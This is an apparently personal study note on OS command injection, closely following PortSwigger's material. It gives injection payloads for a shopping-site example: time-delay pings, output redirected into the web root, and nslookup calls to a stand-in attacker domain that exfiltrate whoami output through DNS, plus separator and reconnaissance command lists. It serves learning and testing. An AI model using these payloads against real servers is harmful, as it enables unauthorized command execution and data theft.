# OS Command injection

OS command injection is also known as shell injection. It allows an attacker to execute operating system (OS) commands on the server that is running an application, and typically fully compromise the application and its data. Often, an attacker can leverage an OS command injection vulnerability to compromise other parts of the hosting infrastructure, and exploit trust relationships to pivot the attack to other systems within the organization.

### Talbe of content

- [OS injection](#os-command-injection)
- [Bind OS injection](#blind-command-injection)
    - [Dectect blind injection using time delays](#dectect-blind-injection-using-time-delays)
    - [Redirect output](#redirecting-output)
    - [Exploiting blind OS command injection using out-of-band (OAST) techniques](#exploiting-blind-os-command-injection-using-out-of-band-oast-techniques)
- [Usefull command to execute](#usefull-command-to-execute)

## Os command injection

In this example, a shopping application lets the user view whether an item is in stock in a particular store. This information is accessed via a URL: `https://insecure-website.com/stockStatus?productID=381&storeID=29`

To provide the stock information, the application must query various legacy systems. For historical reasons, the functionality is implemented by calling out to a shell command with the product and store IDs as arguments: `stockreport.pl 381 29`

This command outputs the stock status for the specified item, which is returned to the user.

The application implements no defenses against OS command injection, so an attacker can submit the following input to execute an arbitrary command: `& echo aiwefwlguh &`

If this input is submitted in the productID parameter, the command executed by the application is: `stockreport.pl & echo aiwefwlguh & 29`

## Blind command injection

Many instances of OS command injection are blind vulnerabilities. This means that the application does not return the output from the command within its HTTP response. Blind vulnerabilities can still be exploited, but different techniques are required.

### Dectect blind injection using time delays

You can use an injected command to trigger a time delay, enabling you to confirm that the command was executed based on the time that the application takes to respond.

```bash
& ping -c 10 127.0.0.1 &
```

### Redirecting output

You can redirect the output from the injected command into a file within the web root that you can then retrieve using the browser. For example, if the application serves static resources from the filesystem location /var/www/static, then you can submit the following input:

```sh
& whoami > /var/www/static/whoami.txt &
```

### Exploiting blind OS command injection using out-of-band (OAST) techniques

You can use an injected command that will trigger an out-of-band network interaction with a system that you control, using OAST techniques.

```bash
& nslookup kgji2ohoyw.web-attacker.com &
```

This payload uses the nslookup command to cause a DNS lookup for the specified domain. The attacker can monitor to see if the lookup happens, to confirm if the command was successfully injected.

The out-of-band channel provides an easy way to exfiltrate the output from injected commands:

```sh
& nslookup `whoami`.kgji2ohoyw.web-attacker.com &
```

This causes a DNS lookup to the attacker's domain containing the result of the whoami command:

wwwuser.kgji2ohoyw.web-attacker.com

## Usefull command to execute

### Get informations on the system:

linux | windows | info
--- | --- | ---
`whoami` | `whoami` | current user name
`uname -a` | `ver` | operating system
`ifconfig` | `ipconfig /all` | network conf
`netstat -an` | `netstat -an` | network connections
`ps -ef` | `tasklist` | running process

### Way of injecting OS command

Command separator:

```bash
&
&&
|
||
```

Only work on linux:

```sh
;

#newline :
0x0a or \n

# inline exec of a injec command within the original command
`whoami`
$(whoami)
```


### Documentation

- [portswigger](https://portswigger.net/web-security/os-command-injection)

---

[**:arrow_right_hook: Back home**](/README.md)